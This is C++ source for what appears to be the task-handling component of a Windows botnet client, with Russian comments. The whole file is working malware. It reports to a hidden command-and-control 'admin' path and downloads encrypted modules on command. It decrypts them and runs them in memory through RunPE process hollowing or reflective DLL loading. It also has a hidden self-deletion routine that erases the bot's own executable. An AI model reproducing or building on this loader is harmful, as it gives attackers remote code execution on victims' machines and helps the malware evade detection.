#include <Windows.h>
#include <wbemidl.h>
#include <ctime>
#include <comutil.h>
#include <stdint.h>

#include "Debug_to_file.h"
#include "Crypt.h"
#include "Core/Common.h"
#include "Core/core.h"
#include "MemLimits.h"

static wchar_t post_reqv[1024];
static uint8_t ascii_reqv[1024 * sizeof(wchar_t)];
static wchar_t unicode[1024];
static wchar_t PostStr[1024];

static int (*start_module)(wchar_t* params) = NULL; //Указатель на функции запуска модуля

static void send_error(wchar_t* botId, char* id_command, uint32_t castom_error, uint32_t get_last_error) {

	char* Data = (char*)malloc(MAX_MODULE_SIZE);
	if (Data == NULL) {
		DEBUG_TO_FILE("+++ NO FREE MEMORY\r\n");
		return;
	}

	wchar_t unicode_id_com[1024];
	ASCIIToUnicode((char*)id_command, unicode_id_com);

	//Загрузить модуль из админки
	API(USER32, wsprintfW)(post_reqv, L"%s|%s|%d|%d|", unicode_id_com, botId, castom_error, get_last_error);

	UnicodeToASCII(post_reqv, (char*)ascii_reqv);
	uint32_t size_data = strlen((const char*)ascii_reqv) + 1;
	DWORD Module_size = 0;

	uint8_t* data_to_send = NULL;
	data_to_send = gen_data_to_send(ascii_reqv, size_data);
	if (data_to_send == NULL) {
		free(Data);
		DEBUG_TO_FILE("+++ data_to_send is NULL \r\n");
		return;
	}

	ASCIIToUnicode((char*)data_to_send, unicode);
	//Посылка запроса в админку на регистрацию бота
	wsprintf(PostStr, L"tes=1&data=%s", unicode);
	PostRequestParts(hide_admin_path(), 0, hide_error_path(), PostStr, &Module_size, (BYTE*)Data);
	free(Data);
}

void do_destroy() {
	wchar_t path_newbot[1024];
	wchar_t path_bot[1024];
	wchar_t cmdParametrs[MAX_PATH];

	GetModuleFileNameW(NULL, path_bot, sizeof(path_bot) / sizeof(path_bot[0]));
	SHELLEXECUTEINFO sei;
	wchar_t cmd_path[MAX_PATH];
	GetEnvironmentVariableW(L"COMSPEC", cmd_path, MAX_PATH);
	wsprintfW(cmdParametrs, L"/c del %ls > nul", path_bot);
	sei.cbSize = sizeof(sei);
	sei.hwnd = 0;
	sei.lpVerb = L"Open";
	sei.lpFile = cmd_path;
	sei.lpParameters = cmdParametrs;
	sei.lpDirectory = 0;
	sei.nShow = SW_HIDE;
	sei.fMask = SEE_MASK_NOCLOSEPROCESS;
	if (ShellExecuteEx(&sei))
	{
		SetPriorityClass(sei.hProcess, IDLE_PRIORITY_CLASS); //removing process stops
		SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS); //accelerate our process
		SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL); //accelerate our thread
		SHChangeNotify(SHCNE_DELETE, SHCNF_PATH, path_bot, 0);
		ExitProcess(0);
	}	
}

int parse_task_and_exec(wchar_t* botId, char* DecResponse) {

	int ret_code = 0;
	int count = 0;
	bool is_found = false;

	char* id_command = NULL;
	char* command_name = NULL;
	char* params = NULL;
	char* run_module = NULL;
	char* name_module = NULL;

	//Парсинг параметров
	char* task = strtok((char*)DecResponse, "|");
	if (task != NULL) {
		DEBUG_TO_FILE("+++ task:%s\r\n", task);
		id_command = strtok(NULL, "|");
	}

	if (id_command != NULL) {
		DEBUG_TO_FILE("+++ id_command:%s\r\n", id_command);
		command_name = strtok(NULL, "|");
	}

	//Проверка параметров
	if ((task == NULL) || (id_command == NULL) || (command_name == NULL)) {
		//Возвратить ошибку
		DEBUG_TO_FILE("+++ ERROR PARAM\r\n");
		send_error(botId, id_command, LOAD_MODULE_ERROR, GetLastError());
		return LOAD_MODULE_ERROR;
	}

	if (!strcmp((const char*)command_name, hide_str_self_destroy())) { //Нужно запустить команду дестрой
		send_error(botId, id_command, 0, 0);
		do_destroy();
	}
	else {//Нужно запустить модуль
		if (!strcmp((const char*)command_name, hide_str_run_module())) {
			name_module = strtok(NULL, "|");
			if (name_module == NULL) {
				//Возвратить ошибку
				DEBUG_TO_FILE("+++ ERROR PARAM\r\n");
				send_error(botId, id_command, LOAD_MODULE_ERROR, GetLastError());
				return LOAD_MODULE_ERROR;
			}

			//Определение параметров модуля
			params = strtok(NULL, "|");

			char* Module = (char*)malloc(MAX_MODULE_SIZE);
			if (Module == NULL) {
				DEBUG_TO_FILE("+++ NO FREE MEMORY\r\n");
				send_error(botId, id_command, ENOMEM, GetLastError());
				return ENOMEM;
			}

			char* Module_dec = (char*)malloc(MAX_MODULE_SIZE);
			if (Module_dec == NULL) {
				DEBUG_TO_FILE("+++ NO FREE MEMORY\r\n");
				send_error(botId, id_command, ENOMEM, GetLastError());
				return ENOMEM;
			}

		    char module_to_send[1024];
			sprintf(module_to_send, "%s|", name_module);

			//Загрузить модуль из админки
			uint32_t size_data = strlen((const char*)module_to_send) + 1;
			DWORD Module_size = 0;

			uint8_t* data_to_send = NULL;
			data_to_send = gen_data_to_send((uint8_t*)module_to_send, size_data);
			if (data_to_send == NULL) {
				DEBUG_TO_FILE("+++ data_to_send is NULL \r\n");
				free(Module);
				free(Module_dec);
				send_error(botId, id_command, LOAD_MODULE_ERROR, GetLastError());
				return LOAD_MODULE_ERROR;
			}

			ASCIIToUnicode((char*)data_to_send, unicode);
			//Посылка запроса в админку на регистрацию бота
			wsprintf(PostStr, L"tes=1&data=%s", unicode);

			int ret = PostRequestParts(hide_admin_path(), 0, hide_download_module_path(), PostStr, &Module_size, (BYTE*)Module);
			DEBUG_TO_FILE("+++ Module name is %s size %d params module:%s to start...\r\n", module_to_send, Module_size, params);
			if (Module_size == 0) {
				send_error(botId, id_command, LOAD_MODULE_ERROR, GetLastError());
				free(Module);
				free(Module_dec);
				return LOAD_MODULE_ERROR;
			}

			//Расшифровать модуль
			decrypt_recv_data((uint8_t*)Module, Module_size - 32, (uint8_t*)Module_dec);

			//Определение что запускать EXE или DLL
			char* pch = strtok(name_module, ".");
			if(pch != NULL) {
				pch = strtok(NULL, ".");
			}

			if (pch != NULL) {
				if (!strcmp(pch, hide_str_exe())) {// Нужно запустить EXE
					send_error(botId, id_command, 0, 0);
					if (params != NULL) {
						RunPE(params, Module_dec);
					}
					return 0;
				}
			}

			DEBUG_TO_FILE("Start dll...\r\n", __LINE__);
			//Если модуль длл, то загрузим его из памяти
			//Загрузка модуля и получения указателя на нужную функцию
			HMODULE hModule = (HMODULE)LoadModule((char*)Module_dec);
			if (hModule == 0) {
				DEBUG_TO_FILE("+++ Load_module error (LoadModule)\r\n");
				send_error(botId, id_command, LOAD_MODULE_ERROR, GetLastError());
				free(Module);
				free(Module_dec);
				return LOAD_MODULE_ERROR;
			}
			(FARPROC&)start_module = GetModuleProcAddress(hModule, (char*)"start_module");
			if (!start_module) {
				DEBUG_TO_FILE("+++ Load_module error (GetApiAddr)\r\n");
				send_error(botId, id_command, LOAD_MODULE_ERROR, GetLastError());
				FreeLoadedModule(hModule);
				free(Module);
				free(Module_dec);
				return LOAD_MODULE_ERROR;
			}

			if (params != NULL) {
				ASCIIToUnicode((char*)params, unicode);
			}

			ret = start_module(unicode);
			if (ret == 0) {
				send_error(botId, id_command, 0, 0);
			}
			else {
				send_error(botId, id_command, ret, GetLastError());
			}

			//Чистка
			FreeLoadedModule(hModule);
			free(Module);
			free(Module_dec);
		}
	}
	return 0;
}